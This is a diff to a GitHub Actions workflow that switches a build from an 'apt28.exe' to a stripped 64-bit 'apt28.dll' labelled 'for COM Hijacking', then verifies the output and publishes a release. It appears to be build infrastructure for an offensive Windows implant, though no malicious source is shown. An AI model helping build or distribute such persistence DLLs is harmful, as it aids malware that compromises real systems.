@@ -22,11 +22,12 @@ jobs:
     - name: Create Output Directory
       run: New-Item -ItemType Directory -Path .\output -Force | Out-Null
 
-    - name: Compile 64-bit Binary
+    - name: Compile DLL for COM Hijacking
       run: |
         cd src
-        gcc main.c -o ..\output\apt28.exe -s -m64 -Wall -Wextra `
-          -lwininet -lws2_32 -lntdll -lwinmm -lpsapi -luser32 -lgdi32 -lkernel32 -liphlpapi -ladvapi32
+        gcc -shared main.c -o ..\output\apt28.dll exports.def -s -m64 -Wall -Wextra `
+          -Wl,--subsystem,windows -Wl,--gc-sections -Wl,--strip-all `
+          -lws2_32 -lwininet -lgdi32 -lole32 -loleaut32 -luuid -lntdll -lwinmm -lpsapi -luser32 -lkernel32 -liphlpapi -ladvapi32
         if ($LASTEXITCODE -ne 0) {
           Write-Error "Compilation failed"
           exit 1
@@ -40,11 +41,11 @@ jobs:
 
     - name: Verify Build Output
       run: |
-        if (-not (Test-Path .\output\apt28.exe)) {
-          Write-Error "Build output not found: .\output\apt28.exe"
+        if (-not (Test-Path .\output\apt28.dll)) {
+          Write-Error "Build output not found: .\output\apt28.dll"
           exit 1
         }
-        Write-Output "Build successful: $(Get-Item .\output\apt28.exe | ForEach-Object { $_.Length } ) bytes"
+        Write-Output "Build successful: $(Get-Item .\output\apt28.dll | ForEach-Object { $_.Length } ) bytes"
 
     - name: Create Release
       uses: softprops/action-gh-release@v2
